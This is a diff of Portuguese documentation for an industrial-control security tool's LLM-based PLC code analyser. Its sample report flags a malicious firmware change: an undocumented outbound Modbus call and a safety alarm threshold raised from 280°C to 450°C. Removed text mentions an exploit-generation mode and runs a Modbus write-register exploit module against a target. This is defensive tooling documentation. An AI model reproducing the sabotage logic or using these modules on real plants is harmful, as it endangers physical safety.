+      --diff /opt/plc/firmware_v3.6_extracted_from_device.st
+
+[*] Comparando firmware baseline vs extraído do dispositivo...
+
+  RELATÓRIO DIFERENCIAL — Possível Modificação Maliciosa
+  ═══════════════════════════════════════════════════════════════════
+
+  FINDING [SEVERITY: CRITICAL]: Instrução de Rede Adicionada (Não Documentada)
+    + MB_CLIENT(REQ:=TRUE, IP_ADDR:='10.99.0.5', PORT:=502, ...);
+    Análise: Conexão Modbus de saída para IP externo não documentado
+    Risco:   Canal de exfiltração de dados de processo ou C2 oculto
+    Ação:    Não reimplantar firmware — iniciar investigação forense imediata
+
+  FINDING [SEVERITY: CRITICAL]: Lógica de Alarme Modificada
+    Original:   IF Process_Temp > 280.0 THEN Alarm_High := TRUE; END_IF;
+    Modificado: IF Process_Temp > 450.0 THEN Alarm_High := TRUE; END_IF;
+    Análise:    Threshold elevado de 280°C para 450°C (60% acima do limite seguro)
+
+  RESUMO DIFERENCIAL: 2 CRITICAL, 3 HIGH, 1 MEDIUM
 ```
 
 ---
 
-## Integração com Módulos IXF
+## Troubleshooting SAST
 
-O motor SAST integra com o sistema de módulos IXF para análise contextualizada:
-
-### Uso via módulo assessment
+### Erro: LLM não configurado
 
 ```
-ixf > use assessment/sast/plc_source_analyzer
-[+] Module loaded: PLC Source Code SAST Analyzer
-
-ixf (PLC Source Code SAST Analyzer) > show options
-+----------+-----------+--------+------------------------------------------+
-| Opção    | Valor     | Obrig. | Descrição                                |
-|----------|-----------|--------|------------------------------------------|
-| target   |           | sim    | Caminho do arquivo/diretório PLC         |
-| mode     | sast      | não    | Modo de análise: sast/reverse/diff/exploit-gen |
-| diff_with|           | não    | Segundo arquivo para modo diff           |
-| simulate | False     | não    | Não aplicável ao SAST (sempre executa)   |
-+----------+-----------+--------+------------------------------------------+
-
-ixf (PLC Source Code SAST Analyzer) > set target /opt/plc/water_treatment.st
-ixf (PLC Source Code SAST Analyzer) > set mode sast
-ixf (PLC Source Code SAST Analyzer) > run
+ixf > sast /opt/plc/test.st
+[-] Nenhum provider LLM configurado.
+    Use: llm-key gemini <api_key>
+    Ou defina: export GOOGLE_AI_STUDIO_API_KEY=<chave>
 ```
 
-### Uso direto via comando sast
-
-O comando `sast` é um atalho que carrega e executa o módulo automaticamente:
+**Solução:**
 
 ```
-# Equivalente ao fluxo acima
-ixf > sast /opt/plc/water_treatment.st --mode sast
-
-# Modo diff
-ixf > sast /opt/plc/v1.st --mode diff --diff /opt/plc/v2.st
-
-# Modo reverse
-ixf > sast /opt/firmware/controller.bin --mode reverse
-
-# Exploit generation
-ixf > sast /opt/plc/batch.sfc --mode exploit-gen
+ixf > llm-key gemini AIzaSy...
+[+] LLM key configured: provider=gemini len=39
 ```
 
----
+### Erro: Rate limit do provider
 
-## API Python para SAST
+O IXF tenta automaticamente com backoff exponencial. Se persistir, alterne para outro provider:
 
-O motor SAST pode ser usado programaticamente:
+```
+ixf > llm-key anthropic sk-ant-api03-xxx
+[+] LLM key configured: provider=anthropic len=22
+# Agora anthropic é o provider ativo
+```
 
-```python
-from industrialxpl.modules.assessment.sast.plc_source_analyzer import (
-    _llm_manager,
-    PLCSourceAnalyzer,
-)
+### Análise incompleta por tamanho
 
-# Configurar provider LLM
-_llm_manager.set_key("gemini", "AIzaSy...")
+Para projetos com > 32.000 caracteres, o IXF segmenta automaticamente e consolida os relatórios parciais:
 
-# Instanciar analisador
-analyzer = PLCSourceAnalyzer()
-analyzer.target = "/opt/plc/water_treatment/"
-analyzer.mode = "sast"
+```
+[*] Tamanho do projeto: 150,000 chars (muito grande)
+[*] Segmentando em 5 partes para análise...
+[*] Parte 1/5: safety_logic.st (10,200 chars)
+[*] Parte 2/5: process_control.st (11,400 chars)
+[*] Parte 3/5: communication.st (9,800 chars)
+[*] Parte 4/5: hmi_interface.st (10,100 chars)
+[*] Parte 5/5: batch_control.sfc (10,500 chars)
+[*] Consolidando 5 relatórios parciais...
+[+] Relatório consolidado: 8 CRITICAL, 12 HIGH, 15 MEDIUM
+```
 
-# Executar análise
-analyzer.run()
+**Dica:** Para projetos muito grandes, analise por subsistema para resultados mais focados:
 
-# Para uso em scripts de automação
-import os
-os.environ["GOOGLE_AI_STUDIO_API_KEY"] = "AIzaSy..."
-
-cls = import_exploit("industrialxpl.modules.assessment.sast.plc_source_analyzer")
-mod = cls()
-mod.target = "/opt/plc/project/"
-mod.mode = "sast"
-mod.simulate = False  # SAST sempre executa mesmo com simulate=True
-mod.run()
+```
+ixf > sast /opt/plc/projeto/safety/ --mode sast      # Safety primeiro
+ixf > sast /opt/plc/projeto/processo/ --mode sast     # Processo
+ixf > sast /opt/plc/projeto/comunicacao/ --mode sast  # Comunicação
 ```
 
 ---
 
-## Casos de Uso por Setor
-
-### Setor de Água e Saneamento
-
-```
-ixf > sast /opt/plc/water_treatment/
-# Foco em: dosagem química, limites de pH, proteções de bomba, cloração
-
-ixf > sast industrialxpl/resources/sast_examples/water_treatment_chemical_dosing.st
-# Exemplo incluído com vulnerabilidades conhecidas para treinamento
-```
-
-### Setor de Energia Elétrica
-
-```
-ixf > sast /opt/iec61850/substation_protection.st
-# Foco em: lógica de proteção de relés, habilitação de disjuntores,
-#           interlocking de barramento, coordination de proteção
-
-ixf > sast industrialxpl/resources/sast_examples/power_grid_substation.st
-```
-
-### Óleo e Gás
-
-```
-ixf > sast /opt/plc/pipeline_ems/
-# Foco em: sistemas ESD, pressão máxima de operação, válvulas de alívio,
-#           detecção de vazamentos, proteção de compressores
-
-ixf > sast industrialxpl/resources/sast_examples/gas_pipeline_pressure_control.st
-```
-
-### Manufatura Farmacêutica / Alimentícia
-
-```
-ixf > sast /opt/batch/pharmaceutical_process.sfc --mode sast
-# Foco em: sequência de batch, temperaturas de esterilização,
-#           integridade de dados 21 CFR Part 11, rastreabilidade
-```
-
-### Nuclear
-
-```
-ixf > sast industrialxpl/resources/sast_examples/nuclear_reactor_cooling.st
-# ALTAMENTE SENSITIVO — usar apenas em ambiente de laboratório controlado
-# Foco em: SCRAM, sistemas de resfriamento de emergência, containment
-```
-
----
-
-## Boas Práticas
-
-### 1. Use modo diff regularmente em qualquer mudança de código PLC
-
-```
-# Antes de qualquer implantação:
-ixf > sast /opt/plc/producao/current.st --mode diff --diff /opt/plc/staging/next.st
-# Detecta mudanças suspeitas antes da implantação
-```
-
-### 2. Automatize análise SAST em pipelines CI/CD de engenharia
-
-```bash
-#!/bin/bash
-# Script de verificação pré-implantação PLC
-CURRENT_VERSION="/opt/plc/v${CURRENT_VER}.st"
-NEW_VERSION="/opt/plc/v${NEW_VER}.st"
-
-echo "Executando análise SAST diferencial..."
-ixf sast "$CURRENT_VERSION" --mode diff --diff "$NEW_VERSION"
-if [ $? -ne 0 ]; then
-    echo "SAST encontrou problemas críticos — implantação bloqueada"
-    exit 1
-fi
-```
-
-### 3. Nunca envie código com credenciais reais — verifique sanitização
-
-```
-ixf > sast /opt/plc/project/ --mode sast
-# Verificar relatório de sanitização antes de confirmar envio:
-# [*] Sanitizando... 3 credenciais, 2 IPs públicos
-# Confirmar que dados sensíveis foram removidos
-```
-
-### 4. Para firmware binário, use modo reverse com contexto de arquitetura
-
-```
-# Fornecer contexto no caminho para ajudar na análise
-ixf > sast /opt/firmware/siemens_cpu314_v3.6.bin --mode reverse
-```
-
-### 5. Compare achados SAST com módulos de exploit IXF para verificação
-
-```
-# SAST identificou vulnerabilidade Modbus sem autenticação
-ixf > use exploits/protocols/modbus/modbus_write_register
-ixf > set target 192.168.1.100
-ixf > check
-# Confirmar que vulnerabilidade identificada pelo SAST é realmente exploitável
-```
-
----
-
-*Anterior: [MITRE ATT&CK for ICS](06-mitre-attack-ics.md) | Próximo: [Protocolos e Vendors](08-protocolos-vendors.md)*
+*Anterior: [MITRE ATT&CK para ICS](06-mitre-attack-ics.md) | Próximo: [Protocolos e Vendors](08-protocolos-vendors.md)*
